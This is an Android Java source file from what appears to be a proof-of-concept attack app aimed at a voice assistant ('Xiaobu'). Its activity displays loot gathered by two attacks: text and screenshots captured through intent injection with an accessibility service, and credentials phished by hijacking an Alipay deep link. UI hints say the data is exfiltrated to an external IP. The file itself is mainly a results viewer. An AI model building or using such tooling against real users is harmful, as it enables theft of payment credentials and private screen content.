package com.attacker.xiaobu;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.*;
import java.io.File;
import java.util.Arrays;

public class ResultViewerActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(20, 36, 20, 36);

        root.addView(title("📊 攻击成果"));

        // === 漏洞1 ===
        root.addView(section("🐚 漏洞1: SEND注入 + 无障碍服务"));
        root.addView(subtitle("📄 窃取文本 (最近3次)"));
        root.addView(hint("数据同时外泄至 192.144.228.237:8080"));

        boolean hasText = false;
        for (int i = 0; i < 3; i++) {
            File f = new File("/sdcard/attacker_output_" + i + ".txt");
            if (f.exists()) {
                hasText = true;
                String content = readFile(f.getAbsolutePath());
                if (content != null) {
                    root.addView(textCard(content,
                        "#" + (i+1) + " · " + f.length() + "B · " +
                        new java.text.SimpleDateFormat("HH:mm:ss").format(f.lastModified())));
                }
            }
        }
        if (!hasText) root.addView(hint("暂无 (点击攻击按钮后自动出现)"));

        // 截图 - 全宽原始分辨率
        root.addView(subtitle("📸 截图 (点击查看大图,最近3张)"));
        File[] screens = new File("/sdcard/").listFiles(f ->
                f.getName().startsWith("attacker_screen_") && f.getName().endsWith(".png"));
        if (screens != null && screens.length > 0) {
            Arrays.sort(screens, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
            for (int i = 0; i < Math.min(3, screens.length); i++) {
                root.addView(fullImage(screens[i], i + 1));
            }
        } else {
            root.addView(hint("暂无 (跳转到目标App后自动截图)"));
        }

        // === 漏洞2 (原漏洞3, DeepLink劫持) ===
        root.addView(section("🎣 漏洞2: 支付宝DeepLink劫持 + 钓鱼"));
        root.addView(hint("凭证外泄至 192.144.228.237:8080/phish"));

        File hijack = new File("/sdcard/deeplink_hijack.txt");
        if (hijack.exists()) {
            String raw = readFile(hijack.getAbsolutePath());
            if (raw != null) {
                // 按---分割,倒序(最新在前)
                String[] entries = raw.split("---\\n===");
                StringBuilder reversed = new StringBuilder();
                for (int i = entries.length - 1; i >= 0; i--) {
                    String e = entries[i].trim();
                    if (!e.isEmpty()) reversed.append("===").append(e).append("\n---\n");
                }
                root.addView(textCard(reversed.toString(),
                    hijack.length() + "B · " +
                    new java.text.SimpleDateFormat("HH:mm:ss").format(hijack.lastModified())));
            }
        } else {
            root.addView(hint("暂无 (对小布说'打开支付宝付款码'并选择'支付宝')"));
        }

        scroll.addView(root);
        setContentView(scroll);
    }

    private LinearLayout fullImage(File file, int idx) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundColor(0xFFF5F5F5);
        card.setPadding(4, 4, 4, 4);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 16);
        card.setLayoutParams(lp);

        try {
            // 原始分辨率,仅适配屏幕宽度
            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
            if (bm != null) {
                int screenW = getResources().getDisplayMetrics().widthPixels - 50;
                int h = (int) (bm.getHeight() * (float) screenW / bm.getWidth());
                Bitmap scaled = Bitmap.createScaledBitmap(bm, screenW, h, true);
                ImageView iv = new ImageView(this);
                iv.setImageBitmap(scaled);
                iv.setScaleType(ImageView.ScaleType.FIT_XY);
                iv.setAdjustViewBounds(true);
                LinearLayout.LayoutParams ilp = new LinearLayout.LayoutParams(screenW, h);
                iv.setLayoutParams(ilp);
                card.addView(iv);
            }
        } catch (Exception e) {}

        TextView meta = new TextView(this);
        meta.setText("#" + idx + "  " + file.getName() + "  " + (file.length() / 1024) + "KB  "
                + new java.text.SimpleDateFormat("HH:mm:ss").format(file.lastModified()));
        meta.setTextSize(10);
        meta.setTextColor(0xFF888888);
        meta.setPadding(4, 4, 4, 0);
        card.addView(meta);

        return card;
    }

    private LinearLayout textCard(String content, String info) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundColor(0xFFF5F5F5);
        card.setPadding(12, 8, 12, 8);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 12);
        card.setLayoutParams(lp);

        TextView tv = new TextView(this);
        tv.setText(content);
        tv.setTextSize(10);
        tv.setTextColor(0xFF333333);
        tv.setMovementMethod(new ScrollingMovementMethod());
        tv.setMaxHeight(400);
        card.addView(tv);

        TextView meta = new TextView(this);
        meta.setText(info);
        meta.setTextSize(10);
        meta.setTextColor(0xFF888888);
        card.addView(meta);

        return card;
    }

    private TextView title(String t) {
        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(22);
        tv.setGravity(Gravity.CENTER); tv.setPadding(0, 0, 0, 20); return tv;
    }
    private TextView section(String t) {
        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(16);
        tv.setTextColor(0xFF1565C0); tv.setPadding(0, 20, 0, 8); return tv;
    }
    private TextView subtitle(String t) {
        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(13);
        tv.setTextColor(0xFF666666); tv.setPadding(0, 6, 0, 6); return tv;
    }
    private TextView hint(String t) {
        TextView tv = new TextView(this); tv.setText("⚠️ " + t); tv.setTextSize(12);
        tv.setTextColor(0xFF999999); tv.setPadding(0, 4, 0, 14); return tv;
    }

    private String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] d = new byte[Math.min(fis.available(), 8192)];
            fis.read(d); fis.close();
            return new String(d, "UTF-8");
        } catch (Exception e) { return null; }
    }
}
